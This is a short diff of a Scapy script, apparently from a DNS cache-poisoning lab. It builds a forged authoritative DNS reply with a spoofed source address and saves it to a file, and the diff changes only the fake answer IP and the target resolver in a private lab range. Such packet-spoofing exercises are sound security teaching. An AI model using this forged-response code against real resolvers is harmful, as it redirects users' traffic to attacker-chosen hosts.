@@ -3,12 +3,12 @@ from scapy.all import DNSQR, DNSRR, DNS, IP, UDP
 # Construct the DNS header and payload
 name = 'twysw.example.com'
 Qdsec = DNSQR(qname=name)
-Anssec = DNSRR(rrname=name, type='A', rdata='1.1.2.2', ttl=259200)
+Anssec = DNSRR(rrname=name, type='A', rdata='10.9.0.153', ttl=259200)
 dns = DNS(id=0xAAAA, aa=1, rd=0, qr=1,
           qdcount=1, ancount=1, nscount=0, arcount=0,
           qd=Qdsec, an=Anssec)
 # Construct the IP, UDP headers, and the entire packet
-ip = IP(dst='10.0.2.7', src='1.2.3.4', chksum=0)
+ip = IP(dst='10.0.9.53', src='1.2.3.4', chksum=0)
 udp = UDP(dport=33333, sport=53, chksum=0)
 pkt = ip/udp/dns
 # Save the packet to a file
